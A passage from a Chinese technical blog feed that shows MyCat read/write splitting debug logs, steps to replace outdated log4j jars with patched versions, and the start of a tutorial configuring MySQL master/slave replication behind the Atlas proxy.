class="line">23</span><br></pre></td><td class="code"><pre><span class="line">2022-05-08 01:19:04.198 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=11, lastTime=1651943944189, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=15, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{select * from test}, respHandler=SingleNodeHandler [node=dn1{select * from test}, packetId=6], host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2022-05-08 01:22:56.420 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=10, lastTime=1651944176407, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{insert into test values (2,&apos;superman&apos;)}, respHandler=SingleNodeHandler [node=dn1{insert into test values (2,&apos;superman&apos;)}, packetId=1], host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=true]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.execute(NonBlockingSession.java:126)) - ServerConnection [id=3, schema=ha, host=192.168.73.20, user=root,txIsolation=3, autocommit=true, schema=ha, executeSql=insert into test values (2,&apos;superman&apos;)]insert into test values (2,&apos;superman&apos;), route={</span><br><span class="line">   1 -&gt; dn1{insert into test values (2,&apos;superman&apos;)}</span><br><span class="line">} rrs</span><br><span class="line">2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:170)) - rrs.getRunOnSlave() default</span><br><span class="line">2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:172)) - node.getRunOnSlave()  default</span><br><span class="line">2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:182)) - node.getRunOnSlave() null</span><br><span class="line">2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.mysql.nio.handler.SingleNodeHandler.execute(SingleNodeHandler.java:184)) - node.getRunOnSlave() null</span><br><span class="line">2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBNode.getConnection(PhysicalDBNode.java:102)) - rrs.getRunOnSlave()  default</span><br><span class="line">2022-05-08 01:36:04.542 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBNode.getConnection(PhysicalDBNode.java:133)) - rrs.getRunOnSlave()  default</span><br><span class="line">2022-05-08 01:36:04.554 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=10, lastTime=1651944964528, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{insert into test values (2,&apos;superman&apos;)}, respHandler=SingleNodeHandler [node=dn1{insert into test values (2,&apos;superman&apos;)}, packetId=1], host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=true]</span><br><span class="line">2022-05-08 01:36:04.554 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource.releaseChannel(PhysicalDatasource.java:633)) - release channel MySQLConnection [id=10, lastTime=1651944964528, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=23, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]</span><br><span class="line"></span><br><span class="line">2022-05-08 01:36:40.600 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDBPool.getRWBanlanceCon(PhysicalDBPool.java:551)) - select read source rhel_sqlsrv for dataHost:dthost</span><br><span class="line">2022-05-08 01:36:40.601 DEBUG [$_NIOREACTOR-0-RW] (io.mycat.server.NonBlockingSession.releaseConnection(NonBlockingSession.java:386)) - release connection MySQLConnection [id=17, lastTime=1651945000587, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=20, charset=utf8, txIsolation=3, autocommit=true, attachment=dn1{select * from test}, respHandler=SingleNodeHandler [node=dn1{select * from test}, packetId=10], host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]</span><br><span class="line"></span><br><span class="line">2022-05-08 01:53:32.188 DEBUG [Timer0] (io.mycat.sqlengine.SQLJob.connectionAcquired(SQLJob.java:89)) - con query sql:select user() to con:MySQLConnection [id=1, lastTime=1651946012188, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=false, threadId=22, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]</span><br><span class="line">2022-05-08 01:53:32.188 DEBUG [Timer0] (io.mycat.sqlengine.SQLJob.connectionAcquired(SQLJob.java:89)) - con query sql:select user() to con:MySQLConnection [id=14, lastTime=1651946012188, user=root, schema=ha, old shema=ha, borrowed=true, fromSlaveDB=true, threadId=18, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.22, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]</span><br></pre></td></tr></tbody></table></figure><p>&#x8BFB;&#x64CD;&#x4F5C;&#x662F;&#x5728;Slave 192.168.73.22&#x4E0A;&#x8FDB;&#x884C;&#x7684;</p><p>&#x5199;&#x64CD;&#x4F5C;&#x662F;&#x5728;Master 192.168.73.21&#x4E0A;&#x8FDB;&#x884C;&#x7684;</p><h2 id="&#x66FF;&#x6362;log4j"><a href="#&#x66FF;&#x6362;log4j" class="headerlink" title="&#x66FF;&#x6362;log4j"></a>&#x66FF;&#x6362;log4j</h2><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.yuque.com/ccazhw/tuacvk/doq6pc" target="_blank" rel="noopener">https://www.yuque.com/ccazhw/tuacvk/doq6pc</a></p><p>log4j-2.15-jar&#x5305;&#xFF0C;&#x66FF;&#x6362;&#x5373;&#x53EF;&#xFF0C;&#x6700;&#x65B0;&#x7684;log4j&#x7684;jar&#x8BF7;&#x5230;&#x963F;&#x91CC;&#x4E91;maven&#x4ED3;&#x5E93;&#x4E0B;&#x8F7D;</p><ol><li>&#x66FF;&#x6362;log4j&#x4E3A;log4j-1.15,1.15&#x524D;&#x7684;&#x7248;&#x672C;&#x6709;&#x6F0F;&#x6D1E;<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini mycat]&amp; ll ./lib/log4j*</span><br><span class="line">-rwxrwxrwx. 1 mycat mycat  489884 Sep 27  2019 ./lib/log4j-1.2.17.jar</span><br><span class="line">-rwxrwxrwx. 1 mycat mycat   36947 Sep 27  2019 ./lib/log4j-1.2-api-2.5.jar</span><br><span class="line">-rwxrwxrwx. 1 mycat mycat  146761 Sep 27  2019 ./lib/log4j-api-2.5.jar</span><br><span class="line">-rwxrwxrwx. 1 mycat mycat 1106090 Sep 27  2019 ./lib/log4j-core-2.5.jar</span><br><span class="line">-rwxrwxrwx. 1 mycat mycat   22935 Sep 27  2019 ./lib/log4j-slf4j-impl-2.5.jar</span><br><span class="line">[root@ctos7mini mycat]#</span><br></pre></td></tr></tbody></table></figure></li></ol><p>&#x5220;&#x6389;<code>log4j-1.2.17.jar</code>&#xFF0C;<br>&#x66FF;&#x6362;lib&#x6587;&#x4EF6;&#x5939;&#x4E0A;&#x8FF0;&#x7684;4&#x4E2A;&#x6587;&#x4EF6;,&#x66FF;&#x6362;&#x4E3A;&#x4E0B;&#x9762;4&#x4E2A;&#x6587;&#x4EF6; </p><p>&#x5B83;&#x4EEC;&#x7684;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x662F;<br><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-1.2-api" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-1.2-api</a><br><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api</a><br><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core</a><br><a href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j-impl" target="_blank" rel="noopener">https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j-impl</a>  </p><p>&#x8FD9;&#x662F;&#x7F13;&#x5B58;&#x4E0B;&#x6765;&#x7684;&#x6253;&#x5305;&#x597D;&#x7684;,&#x4E0D;&#x4FDD;&#x8BC1;&#x6700;&#x65B0;<br><a href="http://dl.mycat.org.cn/1.6.7.6/20211221142218/log4j-2.17.zip" target="_blank" rel="noopener">http://dl.mycat.org.cn/1.6.7.6/20211221142218/log4j-2.17.zip</a></p><h2 id="MyCat&#x6545;&#x969C;&#x89E3;&#x51B3;"><a href="#MyCat&#x6545;&#x969C;&#x89E3;&#x51B3;" class="headerlink" title="MyCat&#x6545;&#x969C;&#x89E3;&#x51B3;"></a>MyCat&#x6545;&#x969C;&#x89E3;&#x51B3;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MySQL&amp;#x6570;&amp;#x636E;&amp;#x5E93;&amp;#x9AD8;&amp;#x7EA7;&amp;#x5E94;&amp;#x7528;&amp;#x4E4B;&amp;#x8BFB;&amp;#x5199;&amp;#x5206;&amp;#x79BB;&amp;#x2014;&amp;#x2014;MyCat&amp;#x7BC7;&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Atlas实现MySQL读写分离</title>
    <link href="https://marnm.github.io//posts/62ec7971/"/>
    <id>https://marnm.github.io//posts/62ec7971/</id>
    <published>2022-06-07T04:45:45.000Z</published>
    <updated>2022-06-07T05:11:47.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MySQL-Atlas-&#x2014;-&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218;"><a href="#MySQL-Atlas-&#x2014;-&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218;" class="headerlink" title="MySQL + Atlas &#x2014; &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218;"></a>MySQL + Atlas &#x2014; &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x5B9E;&#x6218;</h2><ol><li>&#x6570;&#x636E;&#x5E93;&#x7528;&#x6237;&#x914D;&#x7F6E;</li><li>&#x4E3B;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;</li><li>Atlas&#x914D;&#x7F6E;</li><li>&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;</li></ol><p><strong>&#x5E8F;&#x7AE0;</strong><br>Atlas&#x662F;360&#x56E2;&#x961F;&#x5F04;&#x51FA;&#x6765;&#x7684;&#x4E00;&#x5957;&#x57FA;&#x4E8E;MySQL-Proxy&#x57FA;&#x7840;&#x4E4B;&#x4E0A;&#x7684;&#x4EE3;&#x7406;&#xFF0C;&#x4FEE;&#x6539;&#x4E86;MySQL-Proxy&#x7684;&#x4E00;&#x4E9B;BUG&#xFF0C;&#x5E76;&#x4E14;&#x4F18;&#x5316;&#x4E86;&#x5F88;&#x591A;&#x4E1C;&#x897F;&#x3002;&#x800C;&#x4E14;&#x5B89;&#x88C5;&#x65B9;&#x4FBF;&#x3002;&#x914D;&#x7F6E;&#x7684;&#x6CE8;&#x91CA;&#x5F88;&#x8BE6;&#x7EC6;&#xFF0C;&#x90FD;&#x662F;&#x4E2D;&#x6587;&#x3002;&#x82F1;&#x6587;&#x4E0D;&#x597D;&#x7684;&#x540C;&#x5B66;&#x6709;&#x798F;&#x4E86;&#x3002;<br>Atlas&#x5B98;&#x65B9;&#x94FE;&#x63A5;&#xFF1A; <a href="https://github.com/Qihoo360/Atlas/blob/master/README_ZH.md" target="_blank" rel="noopener">https://github.com/Qihoo360/Atlas/blob/master/README_ZH.md</a><br>Atlas&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#xFF1A; <a href="https://github.com/Qihoo360/Atlas/releases" target="_blank" rel="noopener">https://github.com/Qihoo360/Atlas/releases</a>  </p><p>&#x73AF;&#x5883;&#xFF1A;</p><table><thead><tr><th>&#x7CFB;&#x7EDF;</th><th>IP</th><th>&#x89D2;&#x8272;</th></tr></thead><tbody><tr><td>CentOS7.4</td><td>192.168.73.20</td><td>Atlas&#x4EE3;&#x7406;&#x670D;&#x52A1;</td></tr><tr><td>RHEL 7.3</td><td>192.168.73.21</td><td>MySQL_Master</td></tr><tr><td>RHEL 7.3</td><td>192.168.73.22</td><td>MySQL_Slave</td></tr></tbody></table><p><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>&#x4E09;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x8981;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#xFF01;</p><h2 id="MySQL-Master"><a href="#MySQL-Master" class="headerlink" title="MySQL Master"></a>MySQL Master</h2><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">datadir</span>=/var/lib/mysql</span><br><span class="line"><span class="attr">socket</span>=/var/lib/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line"><span class="attr">symbolic-links</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">log-error</span>=/var/log/mysqld.log</span><br><span class="line"><span class="attr">pid-file</span>=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br><span class="line"><span class="attr">bind-address</span>    = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user</span>=mysql</span><br><span class="line"></span><br><span class="line"><span class="attr">innodb_flush_log_at_trx_commit</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">sync_binlog</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">log-bin</span>=mysql-bin</span><br><span class="line"><span class="attr">server-id</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">binlog-do-db</span>=testdb</span><br><span class="line"><span class="attr">binlog-ignore-db</span>=mysql</span><br><span class="line">skip-name-resolve</span><br><span class="line"></span><br><span class="line"><span class="attr">general_log</span>=<span class="literal">ON</span></span><br><span class="line"><span class="attr">general_log_file</span>= /var/lib/mysql/rhel_sqlsrv.log</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> testdb <span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</span><br><span class="line"></span><br><span class="line">mysql&gt; grant replication slave on *.* to root@&apos;%&apos; identified by &apos;ccc.456&apos;;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select user,host from mysql.user;</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">| user          | host         |</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">| root          | %            |</span><br><span class="line">| slave         | 192.168.73.% |</span><br><span class="line">| mysql.session | localhost    |</span><br><span class="line">| mysql.sys     | localhost    |</span><br><span class="line">| root          | localhost    |</span><br><span class="line">+<span class="comment">---------------+--------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">master</span> <span class="keyword">status</span>;</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| mysql-bin.000003 |     1605 | testdb       | mysql            |                   |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]&amp; mysqldump -uroot -p -B testdb &gt; testdb.sql</span><br><span class="line">Enter password:</span><br><span class="line">[root@rhel7 ~]&amp; ls</span><br><span class="line">anaconda-ks.cfg  ha.sql  mysql_master_ha  rpm_mysql5.7  testdb.sql</span><br><span class="line">[root@rhel7 ~]&amp; scp testdb.sql root@192.168.73.22:~</span><br><span class="line">testdb.sql                                                 100% 2126     2.1KB/s   00:00</span><br><span class="line">[root@rhel7 ~]&amp;</span><br></pre></td></tr></tbody></table></figure><h2 id="MySQL-Slave"><a href="#MySQL-Slave" class="headerlink" title="MySQL Slave"></a>MySQL Slave</h2><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">datadir</span>=/var/lib/mysql</span><br><span class="line"><span class="attr">socket</span>=/var/lib/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line"><span class="attr">symbolic-links</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">log-error</span>=/var/log/mysqld.log</span><br><span class="line"><span class="attr">pid-file</span>=/var/run/mysqld/mysqld.pid</span><br><span class="line"></span><br><span class="line"><span class="attr">bind-address</span>    = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">log-bin</span>=mysql-slave2</span><br><span class="line"><span class="attr">server-id</span>=<span class="number">3</span></span><br><span class="line"><span class="attr">binlog-ignore-db</span>=mysql</span><br><span class="line"><span class="attr">log_slave_updates</span>=<span class="number">1</span></span><br><span class="line">skip-name-resolve</span><br><span class="line"><span class="attr">general_log</span>=<span class="literal">ON</span></span><br><span class="line"><span class="attr">general_log_file</span>=/var/lib/mysql/rhel_sqlsrv.log</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; change master to master_host=&apos;192.168.73.21&apos;, master_user=&apos;root&apos;,master_password=&apos;ccc.456&apos;,master_port=3306,master_log_file=&apos;mysql-bin.000003&apos;,master_log_pos=1605,master_connect_retry=10;</span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; start slave;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 192.168.73.21</span><br><span class="line">                  Master_User: root</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 10</span><br><span class="line">              Master_Log_File: mysql-bin.000003</span><br><span class="line">          Read_Master_Log_Pos: 1605</span><br><span class="line">               Relay_Log_File: rhel_sqlsrv-relay-bin.000002</span><br><span class="line">                Relay_Log_Pos: 320</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.000003</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB:</span><br><span class="line">.........................................&#x7701;&#x7565;...................................................................</span><br><span class="line">             Master_Server_Id: 1</span><br><span class="line">                  Master_UUID: 8f5a42da-cd2d-11ec-8c02-000c29f9275c</span><br><span class="line">             Master_Info_File: /var/lib/mysql/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind:</span><br><span class="line">.........................................&#x7701;&#x7565;...................................................................</span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel_sqlsrv ~]&amp; mysql -uroot -p &lt; testdb.sql</span><br><span class="line">Enter password:</span><br><span class="line">[root@rhel_sqlsrv ~]&amp;</span><br></pre></td></tr></tbody></table></figure><h2 id="&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"><a href="#&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"></a>&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</h2><p><strong>Master</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Database changed</span><br><span class="line">mysql&gt; insert into book values(&apos;abc&apos;,123,456);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>Slave</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from book;</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| name                    | price | pages |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">| Linux                   |    30 |   666 |</span><br><span class="line">| Cloud Computing         |    60 |   666 |</span><br><span class="line">| Operation System        |    80 |   666 |</span><br><span class="line">| Artificial Intelligence |   166 |   666 |</span><br><span class="line">| Linux                   |    66 |   666 |</span><br><span class="line">| Unix                    |    77 |   777 |</span><br><span class="line">| abc                     |   123 |   456 |</span><br><span class="line">+<span class="comment">-------------------------+-------+-------+</span></span><br><span class="line">7 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Atlas&#x914D;&#x7F6E;"><a href="#Atlas&#x914D;&#x7F6E;" class="headerlink" title="Atlas&#x914D;&#x7F6E;"></a>Atlas&#x914D;&#x7F6E;</h2><p><strong>&#x5B89;&#x88C5;Atlas</strong><br></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; rpm -ivh Atlas-2.2.1.el6.x86_64.rpm</span><br><span class="line">Preparing...                          ################################# [100%]</span><br><span class="line">Updating / installing...</span><br><span class="line">   1:Atlas-2.2.1-1                    ################################# [100%]</span><br><span class="line">[root@ctos7mini ~]&amp;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">[root@ctos7mini ~]&amp; ll /usr/local/mysql-proxy/ -R</span><br><span class="line">/usr/local/mysql-proxy/:</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x. 2 root root   75 May  7 04:33 bin</span><br><span class="line">drwxr-xr-x. 2 root root   22 May  7 04:33 conf</span><br><span class="line">drwxr-xr-x. 3 root root 4096 May  7 04:33 lib</span><br><span class="line">drwxr-xr-x. 2 root root    6 Dec 17  2014 log</span><br><span class="line"></span><br><span class="line">/usr/local/mysql-proxy/bin:</span><br><span class="line">total 44</span><br><span class="line">-rwxr-xr-x. 1 root root  9696 Dec 17  2014 encrypt</span><br><span class="line">-rwxr-xr-x. 1 root root 